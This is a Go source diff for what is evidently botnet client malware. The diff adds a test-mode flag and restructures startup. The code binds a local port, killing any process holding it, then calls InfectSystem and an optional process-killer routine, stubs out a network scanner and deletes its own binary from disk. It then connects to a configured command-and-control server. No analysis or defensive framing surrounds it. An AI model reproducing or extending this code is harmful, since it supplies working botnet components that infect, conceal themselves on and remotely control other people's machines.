@@ -18,79 +18,95 @@ type BotInfo struct {
 	Arch string
 }
 
+var TestMode bool
 var Bot *BotInfo
 
 func main() {
 	defer methods.Catch()
 
+	if len(os.Args) > 1 {
+		if os.Args[1] == "-test" {
+			TestMode = true
+		}
+
+	}
+
 	config.Config()
-	if config.DEBUG {
-		pid := syscall.Getpid()
-		fmt.Println("Process id: ", pid)
-	}
 
-	addr := syscall.SockaddrInet4{
-		Port: 63643,
-		Addr: [4]byte{127, 0, 0, 1},
-	}
+	if !TestMode {
 
-	var attempts int
-TryToBind:
-	if fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0); err == nil {
-		defer syscall.Close(fd)
-
-		err := syscall.Bind(fd, &addr)
-		if err != nil {
-			if config.DEBUG {
-				fmt.Println("[init] Can't bind 63643 port: " + err.Error())
-			}
-			attempts++
-			if attempts >= 4 {
-				os.Exit(1)
-			}
-			KillByPort(63643)
-			time.Sleep(1 * time.Second)
-			goto TryToBind
+		if config.DEBUG {
+			pid := syscall.Getpid()
+			fmt.Println("Process id: ", pid)
 		}
 
-		err = syscall.Listen(fd, 1)
-		if err != nil && config.DEBUG {
-			fmt.Println("[init] Can't listen 63643 port: " + err.Error())
+		addr := syscall.SockaddrInet4{
+			Port: 63643,
+			Addr: [4]byte{127, 0, 0, 1},
 		}
+
+		var attempts int
+	TryToBind:
+		if fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0); err == nil {
+			defer syscall.Close(fd)
+
+			err := syscall.Bind(fd, &addr)
+			if err != nil {
+				if config.DEBUG {
+					fmt.Println("[init] Can't bind 63643 port: " + err.Error())
+				}
+				attempts++
+				if attempts >= 4 {
+					os.Exit(1)
+				}
+				KillByPort(63643)
+				time.Sleep(1 * time.Second)
+				goto TryToBind
+			}
+
+			err = syscall.Listen(fd, 1)
+			if err != nil && config.DEBUG {
+				fmt.Println("[init] Can't listen 63643 port: " + err.Error())
+			}
+		}
+
+		CpuMonitor()
+
+		InfectSystem()
+
+		if config.KILLER_ENABLED {
+			go KillerInit()
+		}
+
+		// return
+
+		if runtime.NumCPU() >= config.SCANNER_MIN_NUM_CPU {
+			if config.SCANNER_ENABLED {
+
+				// SOON
+
+				// go StartScanner()
+			}
+		}
+
+		defer methods.Catch()
+
+		go signals(uintptr(syscall.Getpid()))
+
+		exec.Command("ulimit", "-n", "99999").Run()
+
+		if config.PID_CHANGER {
+			syscall.Unlink(os.Args[0])
+		}
+
+	} else {
+		fmt.Println("TEST MODE: YES")
 	}
 
 	Bot = initbot()
 
-	CpuMonitor()
-
-	InfectSystem()
-
-	if config.KILLER_ENABLED {
-		go KillerInit()
-	}
-
-	// return
-
-	if runtime.NumCPU() >= config.SCANNER_MIN_NUM_CPU {
-		if config.SCANNER_ENABLED {
-
-			// SOON
-
-			// go StartScanner()
-		}
-	}
-
-	defer methods.Catch()
-
-	go signals(uintptr(syscall.Getpid()))
-
-	exec.Command("ulimit", "-n", "99999").Run()
-
-	if config.PID_CHANGER {
-		syscall.Unlink(os.Args[0])
-	}
-
 CONNECT:
+
 	connection, err := net.Dial("tcp", config.BOT_SERVER+":"+config.BOT_PORT)
 
 	if err != nil {
@@ -163,7 +179,15 @@ func signals(pid uintptr) {
 }
 
 func initbot() *BotInfo {
+	var arch string
+
+	if runtime.GOOS == "" {
+		arch = "undefined"
+	} else {
+		arch = runtime.GOARCH
+	}
+
 	return &BotInfo{
-		Arch: runtime.GOARCH,
+		Arch: arch,
 	}
 }
